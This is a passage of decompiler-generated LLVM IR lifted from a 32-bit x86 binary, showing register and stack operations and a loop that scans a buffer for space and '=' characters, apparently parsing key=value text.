  store i32 %v1_8049148, i32* %v3_804914f, align 4
  %v0_8049150 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049150 = add i32 %v0_8049145, 8
  %v3_8049150 = inttoptr i32 %v2_8049150 to i32*
  store i32 %v0_8049150, i32* %v3_8049150, align 4
  %v1_8049151 = add i32 %v0_8049145, 4
  %v2_8049151 = inttoptr i32 %v1_8049151 to i32*
  store i32 0, i32* %v2_8049151, align 4
  %v2_8049153 = inttoptr i32 %v0_8049145 to i32*
  store i32 40, i32* %v2_8049153, align 4
  %v3_8049155 = call i32 @function_804ebb0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049155, i32* %eax.global-to-local, align 4
  %v0_804915a = load i32, i32* @esp, align 4
  %v9_804915a = icmp eq i32 %v0_804915a, -12
  store i1 %v9_804915a, i1* %zf.global-to-local, align 1
  %v2_804915d = add i32 %v0_804915a, 8
  %v3_804915d = inttoptr i32 %v2_804915d to i32*
  store i32 %v3_8049155, i32* %v3_804915d, align 4
  %v1_804915e = add i32 %v0_804915a, 120
  %v2_804915e = inttoptr i32 %v1_804915e to i32*
  %v3_804915e = load i32, i32* %v2_804915e, align 4
  store i32 %v3_804915e, i32* %eax.global-to-local, align 4
  %v2_8049162 = add i32 %v0_804915a, 4
  %v3_8049162 = inttoptr i32 %v2_8049162 to i32*
  store i32 %v3_804915e, i32* %v3_8049162, align 4
  %v1_8049163 = add i32 %v0_804915a, 147
  store i32 %v1_8049163, i32* @edx, align 4
  %v3_804916a = inttoptr i32 %v0_804915a to i32*
  store i32 %v1_8049163, i32* %v3_804916a, align 4
  %v4_804916b = call i32 @function_804f8a0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804916b, i32* %eax.global-to-local, align 4
  %v0_8049170 = load i32, i32* @esp, align 4
  %v6_8049170 = icmp eq i32 %v0_8049170, -16
  store i1 %v6_8049170, i1* %zf.global-to-local, align 1
  store i32 %v4_804916b, i32* %ebx.global-to-local, align 4
  %v2_8049175 = add i32 %v4_804916b, 147
  %v3_8049175 = add i32 %v2_8049175, %v0_8049170
  %v4_8049175 = inttoptr i32 %v3_8049175 to i8*
  %v5_8049175 = load i8, i8* %v4_8049175, align 1
  %v11_8049175 = icmp eq i8 %v5_8049175, 32
  %v1_804917d = zext i1 %v11_8049175 to i32
  %v1_8049180 = add i32 %v0_8049170, 147
  store i32 %v1_8049180, i32* %esi.global-to-local, align 4
  store i32 %v1_804917d, i32* %eax.global-to-local, align 4
  %v1_804918c = add i32 %v0_8049170, 12
  %v2_804918c = inttoptr i32 %v1_804918c to i32*
  store i32 2, i32* %v2_804918c, align 4
  %v1_804918e = add i32 %v0_8049170, 8
  %v2_804918e = inttoptr i32 %v1_804918e to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052486.10 to i32), i32* %v2_804918e, align 4
  %v0_8049193 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049193 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049193 = add i32 %v1_8049193, %v0_8049193
  store i32 %v2_8049193, i32* @ebx, align 4
  %v1_8049195 = add i32 %v0_8049170, 120
  %v2_8049195 = inttoptr i32 %v1_8049195 to i32*
  %v3_8049195 = load i32, i32* %v2_8049195, align 4
  %v2_8049199 = sub i32 %v3_8049195, %v2_8049193
  store i32 %v2_8049199, i32* %eax.global-to-local, align 4
  %v0_804919b = load i32, i32* %esi.global-to-local, align 4
  %v2_804919b = add i32 %v0_804919b, %v2_8049193
  %v12_804919b = icmp eq i32 %v2_804919b, 0
  store i1 %v12_804919b, i1* %zf.global-to-local, align 1
  store i32 %v2_804919b, i32* @esi, align 4
  %v2_804919d = add i32 %v0_8049170, 4
  %v3_804919d = inttoptr i32 %v2_804919d to i32*
  store i32 %v2_8049199, i32* %v3_804919d, align 4
  %v0_804919e = load i32, i32* @esi, align 4
  %v3_804919e = inttoptr i32 %v0_8049170 to i32*
  store i32 %v0_804919e, i32* %v3_804919e, align 4
  %v0_804919f = call i32 @function_804f660()
  store i32 %v0_804919f, i32* %eax.global-to-local, align 4
  %v0_80491a4 = load i32, i32* @esp, align 4
  store i32 %v0_804919f, i32* %edx.global-to-local, align 4
  %v10_80491a9 = icmp eq i32 %v0_804919f, -1
  store i1 %v10_80491a9, i1* %zf.global-to-local, align 1
  br i1 %v10_80491a9, label %dec_label_pc_80491db, label %dec_label_pc_80491ae

dec_label_pc_80491ae:                             ; preds = %dec_label_pc_804914f
  %v10_80491ae = icmp eq i32 %v0_804919f, 1
  store i1 %v10_80491ae, i1* %zf.global-to-local, align 1
  %v7_80491b1 = icmp sgt i32 %v0_804919f, 1
  br i1 %v7_80491b1, label %dec_label_pc_80491b3, label %dec_label_pc_80491b6

dec_label_pc_80491b3:                             ; preds = %dec_label_pc_80491ae
  %v1_80491b3 = add i32 %v0_804919f, -2
  %v9_80491b3 = icmp eq i32 %v1_80491b3, 0
  store i1 %v9_80491b3, i1* %zf.global-to-local, align 1
  store i32 %v1_80491b3, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80491b6

dec_label_pc_80491b6:                             ; preds = %dec_label_pc_80491ae, %dec_label_pc_80491b3
  %v1_80491bf = phi i32 [ %v0_804919f, %dec_label_pc_80491ae ], [ %v1_80491b3, %dec_label_pc_80491b3 ]
  %v1_80491b6 = add i32 %v0_80491a4, 20920
  %v1_80491bd = load i32, i32* @ebx, align 4
  %v2_80491bd = add i32 %v1_80491b6, %v1_80491bd
  %v12_80491bd = icmp eq i32 %v2_80491bd, 0
  store i1 %v12_80491bd, i1* %zf.global-to-local, align 1
  store i32 %v2_80491bd, i32* %eax.global-to-local, align 4
  %v2_80491bf = add i32 %v1_80491bf, -20773
  %v3_80491bf = add i32 %v2_80491bf, %v2_80491bd
  %v4_80491bf = inttoptr i32 %v3_80491bf to i8*
  store i8 0, i8* %v4_80491bf, align 1
  %v0_80491c7 = load i32, i32* %eax.global-to-local, align 4
  %v1_80491c7 = load i32, i32* @esp, align 4
  %v2_80491c7 = add i32 %v1_80491c7, -4
  %v3_80491c7 = inttoptr i32 %v2_80491c7 to i32*
  store i32 %v0_80491c7, i32* %v3_80491c7, align 4
  %v0_80491c8 = load i32, i32* %eax.global-to-local, align 4
  %v2_80491c8 = add i32 %v1_80491c7, -8
  %v3_80491c8 = inttoptr i32 %v2_80491c8 to i32*
  store i32 %v0_80491c8, i32* %v3_80491c8, align 4
  %v1_80491c9 = add i32 %v1_80491c7, -12
  %v2_80491c9 = inttoptr i32 %v1_80491c9 to i32*
  store i32 10, i32* %v2_80491c9, align 4
  %v0_80491cb = load i32, i32* @esi, align 4
  %v2_80491cb = add i32 %v1_80491c7, -16
  %v3_80491cb = inttoptr i32 %v2_80491cb to i32*
  store i32 %v0_80491cb, i32* %v3_80491cb, align 4
  %v3_80491cc = call i32 @function_804f6b0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80491cc, i32* %eax.global-to-local, align 4
  %v0_80491d1 = load i32, i32* @esp, align 4
  %v1_80491d1 = add i32 %v0_80491d1, 108
  %v2_80491d1 = inttoptr i32 %v1_80491d1 to i32*
  %v3_80491d1 = load i32, i32* %v2_80491d1, align 4
  store i32 %v3_80491d1, i32* %ecx.global-to-local, align 4
  %v6_80491d5 = icmp eq i32 %v0_80491d1, -16
  store i1 %v6_80491d5, i1* %zf.global-to-local, align 1
  %v2_80491d8 = add i32 %v3_80491d1, 12
  %v3_80491d8 = inttoptr i32 %v2_80491d8 to i32*
  store i32 %v3_80491cc, i32* %v3_80491d8, align 4
  br label %dec_label_pc_80491db

dec_label_pc_80491db:                             ; preds = %dec_label_pc_804914f, %dec_label_pc_8049a67, %dec_label_pc_80491b6
  store i1 true, i1* %zf.global-to-local, align 1
  %v1_80491e0.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80491e0

dec_label_pc_80491e0:                             ; preds = %dec_label_pc_8049301, %dec_label_pc_80491db
  %v1_80491e0 = phi i32 [ %v1_80491e0.pre, %dec_label_pc_80491db ], [ %v0_8049301, %dec_label_pc_8049301 ]
  %storemerge6 = phi i32 [ 0, %dec_label_pc_80491db ], [ %v3_8049301, %dec_label_pc_8049301 ]
  store i32 %storemerge6, i32* @esi, align 4
  %v0_80491e0 = load i32, i32* %eax.global-to-local, align 4
  %v2_80491e0 = add i32 %v1_80491e0, -4
  %v3_80491e0 = inttoptr i32 %v2_80491e0 to i32*
  store i32 %v0_80491e0, i32* %v3_80491e0, align 4
  %v0_80491e1 = load i32, i32* %eax.global-to-local, align 4
  %v2_80491e1 = add i32 %v1_80491e0, -8
  %v3_80491e1 = inttoptr i32 %v2_80491e1 to i32*
  store i32 %v0_80491e1, i32* %v3_80491e1, align 4
  %v1_80491e2 = add i32 %v1_80491e0, -12
  %v2_80491e2 = inttoptr i32 %v1_80491e2 to i32*
  store i32 0, i32* %v2_80491e2, align 4
  %v1_80491e4 = add i32 %v1_80491e0, -16
  %v2_80491e4 = inttoptr i32 %v1_80491e4 to i32*
  store i32 39, i32* %v2_80491e4, align 4
  %v3_80491e6 = call i32 @function_804ebb0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80491e6, i32* %eax.global-to-local, align 4
  %v0_80491eb = load i32, i32* @esp, align 4
  %v1_80491eb = add i32 %v0_80491eb, 147
  %v1_80491f5 = load i32, i32* @esi, align 4
  %v2_80491f5 = add i32 %v1_80491eb, %v1_80491f5
  %v12_80491f5 = icmp eq i32 %v2_80491f5, 0
  store i1 %v12_80491f5, i1* %zf.global-to-local, align 1
  store i32 %v2_80491f5, i32* @ebx, align 4
  %v2_80491f7 = add i32 %v0_80491eb, 8
  %v3_80491f7 = inttoptr i32 %v2_80491f7 to i32*
  store i32 %v3_80491e6, i32* %v3_80491f7, align 4
  %v1_80491f8 = add i32 %v0_80491eb, 120
  %v2_80491f8 = inttoptr i32 %v1_80491f8 to i32*
  %v3_80491f8 = load i32, i32* %v2_80491f8, align 4
  store i32 %v3_80491f8, i32* @ebp, align 4
  %v2_80491fc = add i32 %v0_80491eb, 4
  %v3_80491fc = inttoptr i32 %v2_80491fc to i32*
  store i32 %v3_80491f8, i32* %v3_80491fc, align 4
  %v0_80491fd = load i32, i32* @ebx, align 4
  %v3_80491fd = inttoptr i32 %v0_80491eb to i32*
  store i32 %v0_80491fd, i32* %v3_80491fd, align 4
  %v4_80491fe = call i32 @function_804f8a0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049203 = load i32, i32* @esp, align 4
  %v1_8049206 = add i32 %v4_80491fe, 1
  %v8_8049206 = icmp eq i32 %v1_8049206, 0
  store i1 %v8_8049206, i1* %zf.global-to-local, align 1
  store i32 %v1_8049206, i32* %eax.global-to-local, align 4
  br i1 %v8_8049206, label %dec_label_pc_80493d2, label %dec_label_pc_804920d

dec_label_pc_804920d:                             ; preds = %dec_label_pc_80491e0
  %v1_804920d = add i32 %v0_8049203, 108
  %v2_804920d = inttoptr i32 %v1_804920d to i32*
  %v3_804920d = load i32, i32* %v2_804920d, align 4
  store i32 %v3_804920d, i32* %edx.global-to-local, align 4
  %v1_8049211 = add i32 %v3_804920d, 16
  %v2_8049211 = inttoptr i32 %v1_8049211 to i32*
  %v3_8049211 = load i32, i32* %v2_8049211, align 4
  %v4_8049211 = add i32 %v3_8049211, -4
  %v9_8049211 = sub i32 3, %v3_8049211
  %v10_8049211 = and i32 %v9_8049211, %v3_8049211
  %v11_8049211 = icmp slt i32 %v10_8049211, 0
  %v12_8049211 = icmp eq i32 %v4_8049211, 0
  store i1 %v12_8049211, i1* %zf.global-to-local, align 1
  %v13_8049211 = icmp slt i32 %v4_8049211, 0
  %v3_8049215 = icmp eq i1 %v13_8049211, %v11_8049211
  %v4_8049215 = icmp eq i1 %v12_8049211, false
  %v5_8049215 = and i1 %v4_8049215, %v3_8049215
  br i1 %v5_8049215, label %dec_label_pc_80493d2, label %dec_label_pc_804921b

dec_label_pc_804921b:                             ; preds = %dec_label_pc_804920d
  %v2_804921b = add i32 %v0_8049203, 12
  %v3_804921b = inttoptr i32 %v2_804921b to i32*
  store i32 %v1_8049206, i32* %v3_804921b, align 4
  %v0_804921c = load i32, i32* %eax.global-to-local, align 4
  %v2_804921c = add i32 %v0_8049203, 8
  %v3_804921c = inttoptr i32 %v2_804921c to i32*
  store i32 %v0_804921c, i32* %v3_804921c, align 4
  %v1_804921d = add i32 %v0_8049203, 4
  %v2_804921d = inttoptr i32 %v1_804921d to i32*
  store i32 0, i32* %v2_804921d, align 4
  %v2_804921f = inttoptr i32 %v0_8049203 to i32*
  store i32 39, i32* %v2_804921f, align 4
  %v3_8049221 = call i32 @function_804ebb0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049221, i32* %eax.global-to-local, align 4
  %v0_8049226 = load i32, i32* @esp, align 4
  %v9_8049226 = icmp eq i32 %v0_8049226, -12
  store i1 %v9_8049226, i1* %zf.global-to-local, align 1
  %v2_8049229 = add i32 %v0_8049226, 8
  %v3_8049229 = inttoptr i32 %v2_8049229 to i32*
  store i32 %v3_8049221, i32* %v3_8049229, align 4
  %v1_804922a = add i32 %v0_8049226, 120
  %v2_804922a = inttoptr i32 %v1_804922a to i32*
  %v3_804922a = load i32, i32* %v2_804922a, align 4
  store i32 %v3_804922a, i32* %eax.global-to-local, align 4
  %v2_804922e = add i32 %v0_8049226, 4
  %v3_804922e = inttoptr i32 %v2_804922e to i32*
  store i32 %v3_804922a, i32* %v3_804922e, align 4
  %v0_804922f = load i32, i32* @ebx, align 4
  %v3_804922f = inttoptr i32 %v0_8049226 to i32*
  store i32 %v0_804922f, i32* %v3_804922f, align 4
  %v4_8049230 = call i32 @function_804f8a0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049230, i32* %eax.global-to-local, align 4
  %v0_8049235 = load i32, i32* @esi, align 4
  %v2_8049235 = add i32 %v0_8049235, %v4_8049230
  store i32 %v2_8049235, i32* %edx.global-to-local, align 4
  %v1_8049238 = load i32, i32* @esp, align 4
  %v2_8049238 = add i32 %v1_8049238, 124
  %v3_8049238 = inttoptr i32 %v2_8049238 to i32*
  store i32 %v2_8049235, i32* %v3_8049238, align 4
  %v0_804923c = load i32, i32* @esp, align 4
  %v1_804923c = add i32 %v0_804923c, 16
  %v6_804923c = icmp eq i32 %v1_804923c, 0
  store i1 %v6_804923c, i1* %zf.global-to-local, align 1
  %v1_804923f = load i32, i32* %edx.global-to-local, align 4
  %v2_804923f = add i32 %v0_804923c, 147
  %v3_804923f = add i32 %v2_804923f, %v1_804923f
  %v4_804923f = inttoptr i32 %v3_804923f to i8*
  %v5_804923f = load i8, i8* %v4_804923f, align 1
  %v11_804923f = icmp eq i8 %v5_804923f, 32
  store i1 %v11_804923f, i1* %zf.global-to-local, align 1
  br i1 %v11_804923f, label %dec_label_pc_804939a, label %dec_label_pc_804924d

dec_label_pc_804924d:                             ; preds = %dec_label_pc_804921b, %dec_label_pc_804939a
  %v0_8049256 = phi i32 [ %v1_804923c, %dec_label_pc_804921b ], [ %v0_804924d.pre, %dec_label_pc_804939a ]
  %v1_804924d = add i32 %v0_8049256, 104
  %v2_804924d = inttoptr i32 %v1_804924d to i32*
  %v3_804924d = load i32, i32* %v2_804924d, align 4
  %v0_8049251 = load i32, i32* @ebx, align 4
  %v1_8049251 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049251 = add i32 %v1_8049251, %v0_8049251
  store i32 %v2_8049251, i32* @ebp, align 4
  %v1_8049254 = load i32, i32* @esi, align 4
  %v2_8049254 = sub i32 %v3_804924d, %v1_8049254
  store i32 %v2_8049254, i32* %edi.global-to-local, align 4
  %v1_8049256 = add i32 %v0_8049256, -4
  %v2_8049256 = inttoptr i32 %v1_8049256 to i32*
  store i32 2, i32* %v2_8049256, align 4
  %v0_8049258 = load i32, i32* %edi.global-to-local, align 4
  %v1_8049258 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049258 = sub i32 %v0_8049258, %v1_8049258
  %v12_8049258 = icmp eq i32 %v2_8049258, 0
  store i1 %v12_8049258, i1* %zf.global-to-local, align 1
  store i32 %v2_8049258, i32* @edi, align 4
  %v1_804925a = add i32 %v0_8049256, -8
  %v2_804925a = inttoptr i32 %v1_804925a to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052486.10 to i32), i32* %v2_804925a, align 4
  %v0_804925f = load i32, i32* @edi, align 4
  %v2_804925f = add i32 %v0_8049256, -12
  %v3_804925f = inttoptr i32 %v2_804925f to i32*
  store i32 %v0_804925f, i32* %v3_804925f, align 4
  %v0_8049260 = load i32, i32* @ebp, align 4
  %v2_8049260 = add i32 %v0_8049256, -16
  %v3_8049260 = inttoptr i32 %v2_8049260 to i32*
  store i32 %v0_8049260, i32* %v3_8049260, align 4
  %v0_8049261 = call i32 @function_804f660()
  store i32 %v0_8049261, i32* %eax.global-to-local, align 4
  %v0_8049266 = load i32, i32* @esp, align 4
  %v1_8049266 = add i32 %v0_8049266, 16
  store i32 %v0_8049261, i32* @ebx, align 4
  %v10_804926b = icmp eq i32 %v0_8049261, -1
  store i1 %v10_804926b, i1* %zf.global-to-local, align 1
  br i1 %v10_804926b, label %dec_label_pc_8049301, label %dec_label_pc_8049274

dec_label_pc_8049274:                             ; preds = %dec_label_pc_804924d
  %v1_8049274 = add i32 %v0_8049266, 147
  store i32 %v1_8049274, i32* %esi.global-to-local, align 4
  %v1_804927b = add i32 %v0_8049266, 124
  %v2_804927b = inttoptr i32 %v1_804927b to i32*
  %v3_804927b = load i32, i32* %v2_804927b, align 4
  store i32 %v3_804927b, i32* %eax.global-to-local, align 4
  %v2_804927f = add i32 %v3_804927b, %v1_8049274
  store i32 %v2_804927f, i32* @esi, align 4
  %v10_8049281 = icmp eq i32 %v0_8049261, 1
  store i1 %v10_8049281, i1* %zf.global-to-local, align 1
  %v7_8049284 = icmp sgt i32 %v0_8049261, 1
  br i1 %v7_8049284, label %dec_label_pc_8049286, label %dec_label_pc_8049289

dec_label_pc_8049286:                             ; preds = %dec_label_pc_8049274
  %v1_8049286 = add i32 %v0_8049261, -2
  %v9_8049286 = icmp eq i32 %v1_8049286, 0
  store i1 %v9_8049286, i1* %zf.global-to-local, align 1
  store i32 %v1_8049286, i32* @ebx, align 4
  br label %dec_label_pc_8049289

dec_label_pc_8049289:                             ; preds = %dec_label_pc_8049274, %dec_label_pc_8049286
  %v1_8049289 = add i32 %v0_8049266, 12
  %v2_8049289 = inttoptr i32 %v1_8049289 to i32*
  store i32 1, i32* %v2_8049289, align 4
  %v1_804928b = add i32 %v0_8049266, 8
  %v2_804928b = inttoptr i32 %v1_804928b to i32*
  store i32 ptrtoint (i32* @global_var_8052489.14 to i32), i32* %v2_804928b, align 4
  %v0_8049290 = load i32, i32* @edi, align 4
  %v2_8049290 = add i32 %v0_8049266, 4
  %v3_8049290 = inttoptr i32 %v2_8049290 to i32*
  store i32 %v0_8049290, i32* %v3_8049290, align 4
  %v0_8049291 = load i32, i32* @ebp, align 4
  %v3_8049291 = inttoptr i32 %v0_8049266 to i32*
  store i32 %v0_8049291, i32* %v3_8049291, align 4
  %v0_8049292 = call i32 @function_804f660()
  store i32 %v0_8049292, i32* %eax.global-to-local, align 4
  %v0_8049297 = load i32, i32* @esp, align 4
  %v1_804929a = icmp eq i32 %v0_8049292, 0
  store i1 %v1_804929a, i1* %zf.global-to-local, align 1
  %tmp143 = icmp slt i32 %v0_8049292, 1
  br i1 %tmp143, label %dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge, label %dec_label_pc_804929e

dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge: ; preds = %dec_label_pc_8049289
  %v1_8049297 = add i32 %v0_8049297, 16
  %v1_80492bd.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80492b2

dec_label_pc_804929e:                             ; preds = %dec_label_pc_8049289
  %v1_804929e = add i32 %v0_8049297, 12
  %v2_804929e = inttoptr i32 %v1_804929e to i32*
  store i32 1, i32* %v2_804929e, align 4
  %v1_80492a0 = add i32 %v0_8049297, 8
  %v2_80492a0 = inttoptr i32 %v1_80492a0 to i32*
  store i32 ptrtoint (i32* @global_var_8052489.14 to i32), i32* %v2_80492a0, align 4
  %v0_80492a5 = load i32, i32* @edi, align 4
  %v2_80492a5 = add i32 %v0_8049297, 4
  %v3_80492a5 = inttoptr i32 %v2_80492a5 to i32*
  store i32 %v0_80492a5, i32* %v3_80492a5, align 4
  %v0_80492a6 = load i32, i32* @ebp, align 4
  %v3_80492a6 = inttoptr i32 %v0_8049297 to i32*
  store i32 %v0_80492a6, i32* %v3_80492a6, align 4
  %v0_80492a7 = call i32 @function_804f660()
  store i32 %v0_80492a7, i32* %eax.global-to-local, align 4
  %v0_80492ac = load i32, i32* @esp, align 4
  %v1_80492ac = add i32 %v0_80492ac, 16
  %v6_80492ac = icmp eq i32 %v1_80492ac, 0
  store i1 %v6_80492ac, i1* %zf.global-to-local, align 1
  %v1_80492af = add i32 %v0_80492a7, -1
  store i32 %v1_80492af, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80492b2

dec_label_pc_80492b2:                             ; preds = %dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge, %dec_label_pc_804929e
  %v1_80492bd = phi i32 [ %v1_80492bd.pre, %dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge ], [ %v1_80492af, %dec_label_pc_804929e ]
  %v0_80492bf = phi i32 [ %v1_8049297, %dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge ], [ %v1_80492ac, %dec_label_pc_804929e ]
  %v1_80492b2 = add i32 %v0_80492bf, 20904
  store i32 %v1_80492b2, i32* %eax.global-to-local, align 4
  %v1_80492b9 = add i32 %v0_80492bf, 108
  %v2_80492b9 = inttoptr i32 %v1_80492b9 to i32*
  %v3_80492b9 = load i32, i32* %v2_80492b9, align 4
  store i32 %v3_80492b9, i32* %edx.global-to-local, align 4
  %v2_80492bd = add i32 %v1_80492b2, %v1_80492bd
  %v12_80492bd = icmp eq i32 %v2_80492bd, 0
  store i1 %v12_80492bd, i1* %zf.global-to-local, align 1
  store i32 %v2_80492bd, i32* %eax.global-to-local, align 4
  %v1_80492bf = add i32 %v0_80492bf, 20900
  %v2_80492bf = inttoptr i32 %v1_80492bf to i32*
  store i32 0, i32* %v2_80492bf, align 4
  %v0_80492ca = load i32, i32* %eax.global-to-local, align 4
  %v1_80492ca = load i32, i32* %edx.global-to-local, align 4
  %v2_80492ca = add i32 %v0_80492ca, -20773
  %v3_80492ca = add i32 %v2_80492ca, %v1_80492ca
  %v4_80492ca = inttoptr i32 %v3_80492ca to i8*
  store i8 0, i8* %v4_80492ca, align 1
  br label %dec_label_pc_80492e4

dec_label_pc_80492d4:                             ; preds = %dec_label_pc_80492e4
  br i1 %v13_80492d4, label %dec_label_pc_804930a, label %dec_label_pc_80492da

dec_label_pc_80492da:                             ; preds = %dec_label_pc_80492d4
  %v1_80492da = add i32 %v3_80492ed, 1
  store i32 %v1_80492da, i32* %eax.global-to-local, align 4
  store i32 %v1_80492da, i32* %v2_80492ed, align 4
  br label %dec_label_pc_80492e4

dec_label_pc_80492e4:                             ; preds = %dec_label_pc_80492b2, %dec_label_pc_80492da
  %v0_80492e4 = load i32, i32* @esp, align 4
  %v9_80492e4 = icmp eq i32 %v0_80492e4, 12
  store i1 %v9_80492e4, i1* %zf.global-to-local, align 1
  %v0_80492e7 = load i32, i32* @esi, align 4
  %v2_80492e7 = add i32 %v0_80492e4, -16
  %v3_80492e7 = inttoptr i32 %v2_80492e7 to i32*
  store i32 %v0_80492e7, i32* %v3_80492e7, align 4
  %v2_80492e8 = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_80492e8, i32* %eax.global-to-local, align 4
  %v0_80492ed = load i32, i32* @esp, align 4
  %v1_80492ed = add i32 %v0_80492ed, 20916
  %v2_80492ed = inttoptr i32 %v1_80492ed to i32*
  %v3_80492ed = load i32, i32* %v2_80492ed, align 4
  store i32 %v3_80492ed, i32* @ebx, align 4
  %v2_80492f7 = sub i32 %v2_80492e8, %v3_80492ed
  %v8_80492f7 = xor i32 %v3_80492ed, %v2_80492e8
  %v9_80492f7 = xor i32 %v2_80492f7, %v2_80492e8
  %v10_80492f7 = and i32 %v9_80492f7, %v8_80492f7
  %v11_80492f7 = icmp slt i32 %v10_80492f7, 0
  %v12_80492f7 = icmp eq i32 %v2_80492f7, 0
  store i1 %v12_80492f7, i1* %zf.global-to-local, align 1
  %v13_80492f7 = icmp slt i32 %v2_80492f7, 0
  %v3_80492f9 = icmp eq i1 %v13_80492f7, %v11_80492f7
  %v4_80492f9 = icmp eq i1 %v12_80492f7, false
  %v5_80492f9 = and i1 %v4_80492f9, %v3_80492f9
  %v0_80492d4 = load i32, i32* @esi, align 4
  %v2_80492d4 = add i32 %v0_80492d4, %v3_80492ed
  %v3_80492d4 = inttoptr i32 %v2_80492d4 to i8*
  %v4_80492d4 = load i8, i8* %v3_80492d4, align 1
  %v13_80492d4 = icmp eq i8 %v4_80492d4, 61
  store i1 %v13_80492d4, i1* %zf.global-to-local, align 1
  br i1 %v5_80492f9, label %dec_label_pc_80492d4, label %dec_label_pc_80492fb

dec_label_pc_80492fb:                             ; preds = %dec_label_pc_80492e4
  %v1_80492f4 = add i32 %v0_80492ed, 16
  br i1 %v13_80492d4, label %dec_label_pc_804930a, label %dec_label_pc_8049301

dec_label_pc_8049301:                             ; preds = %dec_label_pc_8049322, %dec_label_pc_8049358, %dec_label_pc_80492fb, %dec_label_pc_804924d, %dec_label_pc_8049369
  %v0_8049301 = phi i32 [ %v1_8049361, %dec_label_pc_8049358 ], [ %v1_80492f4, %dec_label_pc_80492fb ], [ %v1_8049266, %dec_label_pc_804924d ], [ %v0_8049301.pre, %dec_label_pc_8049369 ], [ %v1_8049339, %dec_label_pc_8049322 ]
  %v1_8049301 = add i32 %v0_8049301, 108
  %v2_8049301 = inttoptr i32 %v1_8049301 to i32*
  %v3_8049301 = load i32, i32* %v2_8049301, align 4
  br label %dec_label_pc_80491e0

dec_label_pc_804930a:                             ; preds = %dec_label_pc_80492d4, %dec_label_pc_80492fb
  %v1_804930a = add i32 %v0_80492ed, 108
  %v2_804930a = inttoptr i32 %v1_804930a to i32*
  %v3_804930a = load i32, i32* %v2_804930a, align 4
  store i32 %v3_804930a, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %v2_80492ed, align 4
  %v0_8049319 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049319 = add i32 %v0_8049319, 16
  %v2_8049319 = inttoptr i32 %v1_8049319 to i32*
  %v3_8049319 = load i32, i32* %v2_8049319, align 4
  %v1_804931c = icmp eq i32 %v3_8049319, 0
  store i1 %v1_804931c, i1* %zf.global-to-local, align 1
  %tmp144 = icmp slt i32 %v3_8049319, 1
  br i1 %tmp144, label %dec_label_pc_8049358, label %dec_label_pc_8049320

dec_label_pc_8049320:                             ; preds = %dec_label_pc_804930a
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049322

dec_label_pc_8049322:                             ; preds = %dec_label_pc_8049340, %dec_label_pc_8049320
  %v0_8049322 = phi i32 [ %v4_8049353, %dec_label_pc_8049340 ], [ 0, %dec_label_pc_8049320 ]
  %v2_8049322 = mul i32 %v0_8049322, 128
  %v3_8049322 = icmp eq i32 %v2_8049322, 0
  store i1 %v3_8049322, i1* %zf.global-to-local, align 1
  store i32 %v2_8049322, i32* %eax.global-to-local, align 4
  %v0_8049325 = load i32, i32* @edi, align 4
  %v1_8049325 = load i32, i32* @esp, align 4
  %v2_8049325 = add i32 %v1_8049325, -4
  %v3_8049325 = inttoptr i32 %v2_8049325 to i32*
  store i32 %v0_8049325, i32* %v3_8049325, align 4
  %v0_8049326 = load i32, i32* @ebx, align 4
  %v2_8049326 = add i32 %v1_8049325, -8
  %v3_8049326 = inttoptr i32 %v2_8049326 to i32*
  store i32 %v0_8049326, i32* %v3_8049326, align 4
  %v1_8049327 = add i32 %v1_8049325, 76
  %v2_8049327 = inttoptr i32 %v1_8049327 to i32*
  %v3_8049327 = load i32, i32* %v2_8049327, align 4
  store i32 %v3_8049327, i32* %edx.global-to-local, align 4
  %v0_804932b = load i32, i32* %eax.global-to-local, align 4
  %v2_804932b = add i32 %v3_8049327, 1472
  %v3_804932b = add i32 %v2_804932b, %v0_804932b
  store i32 %v3_804932b, i32* %eax.global-to-local, align 4
  %v2_8049332 = add i32 %v1_8049325, -12
  %v3_8049332 = inttoptr i32 %v2_8049332 to i32*
  store i32 %v3_804932b, i32* %v3_8049332, align 4
  %v0_8049333 = load i32, i32* @esi, align 4
  %v2_8049333 = add i32 %v1_8049325, -16
  %v3_8049333 = inttoptr i32 %v2_8049333 to i32*
  store i32 %v0_8049333, i32* %v3_8049333, align 4
  %v0_8049334 = call i32 @function_804f970()
  store i32 %v0_8049334, i32* %eax.global-to-local, align 4
  %v0_8049339 = load i32, i32* @esp, align 4
  %v1_8049339 = add i32 %v0_8049339, 16
  %v3_804933c = trunc i32 %v0_8049334 to i8
  %v4_804933c = icmp eq i8 %v3_804933c, 0
  store i1 %v4_804933c, i1* %zf.global-to-local, align 1
  %v1_804933e = icmp eq i1 %v4_804933c, false
  br i1 %v1_804933e, label %dec_label_pc_8049301, label %dec_label_pc_8049340

dec_label_pc_8049340:                             ; preds = %dec_label_pc_8049322
  %v1_8049340 = add i32 %v0_8049339, 20916
  %v2_8049340 = inttoptr i32 %v1_8049340 to i32*
